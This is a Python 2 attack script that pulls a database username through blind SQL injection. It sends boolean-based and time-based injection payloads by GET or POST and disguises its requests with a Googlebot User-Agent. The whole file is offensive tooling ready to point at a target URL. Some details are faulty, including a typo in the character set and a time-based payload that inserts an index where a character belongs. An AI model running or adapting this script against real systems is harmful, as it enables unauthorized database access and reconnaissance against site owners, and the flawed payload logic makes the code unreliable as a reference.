#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
Retrieve db user with blind SQLi

Author: p0wd3r
'''

import requests
import argparse
import urllib
import time


class BlindUser(object):

    username = ''
    base_url = 'http://127.0.0.1'
    payloads = 'abcdefghigjklmnopqrstuvwxyz1234567890@_.'
    len_user = 30
    headers = {
        'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'
    }

    def index(self):
        """index"""
        parser = argparse.ArgumentParser(description=
                                         'Retrieve db user with blind SQLi')
        method_group = parser.add_mutually_exclusive_group(required=True)
        method_group.add_argument('-g', help='GET', dest='get', action='store_true')
        method_group.add_argument('-p', help='POST', dest='post', action='store_true')
        type_group = parser.add_mutually_exclusive_group(required=True)
        type_group.add_argument('-b', help='Boolean based', dest='b_based', action='store_true')
        type_group.add_argument('-t', help='Time based', dest='t_based', action='store_true')
        args = parser.parse_args()

        if args.b_based:
            self.boolean_based(vars(args))
        elif args.t_based:
            self.time_based(vars(args))

        print '[+] MySQL username is ' + self.username

    def boolean_based(self, arg_dict):
        """boolean based"""
        len_error = 722

        for pos in xrange(0, self.len_user):
            for i in xrange(0, len(self.payloads)):

                payload = '\' AND SUBSTR(LOWER(USER()),%s,1)=\'%s' % (str(pos), self.payloads[i])

                if arg_dict['get']:
                    url = self.base_url + urllib.quote(payload, '(),=@')
                else:
                    data = {
                        'a': 1
                    }
                    data['para'] = payload

                try:
                    if arg_dict['get']:
                        html = self.make_request(True, url)
                    else:
                        html = self.make_request(False, self.base_url, data=data)
                    if len(html) != len_error:
                        self.username += self.payloads[i]
                        print '[*] ' + self.username
                        time.sleep(3)
                except Exception, e:
                    print '[-] ' + str(e)
                    print '[-] Exit'
                    exit()
                except KeyboardInterrupt:
                    print '\n[-] User aborted'
                    exit()

    def time_based(self, arg_dict):
        """time based"""
        time_to_sleep = 5

        for pos in xrange(1, self.len_user):
            for i in xrange(0, len(self.payloads)):

                payload = '-1; IF(SUBSTRING((SELECT USER),%s,1)=\'%s\') waitfor delay \'0:0:%s\' else SELECT 1' % (str(pos), i, str(time_to_sleep))

                if arg_dict['get']:
                    url = self.base_url + urllib.quote(payload, '(),=@')
                    print url
                else:
                    data = {
                        'a': 1,
                    }
                    data['para'] = payload

                try:
                    start_time = time.time()
                    if arg_dict['get']:
                        self.make_request(True, url)
                    else:
                        self.make_request(False, self.base_url, data=data)
                    if time.time() - start_time > time_to_sleep - 1:
                        self.username += self.payloads[i]
                        print '[*] ' + self.username
                        time.sleep(3)
                except Exception, e:
                    print '[-] ' + str(e)
                    print '[-] Exit'
                    exit()
                except KeyboardInterrupt:
                    print '\n[-] User aborted'
                    exit()

    def make_request(self, is_GET, url, data=None):
        """make request"""
        if is_GET:
            html = requests.get(url, headers=self.headers).content
            return html
        else:
            html = requests.post(url, headers=self.headers, data=data).content
            return html

if __name__ == '__main__':
    b = BlindUser()
    b.index()
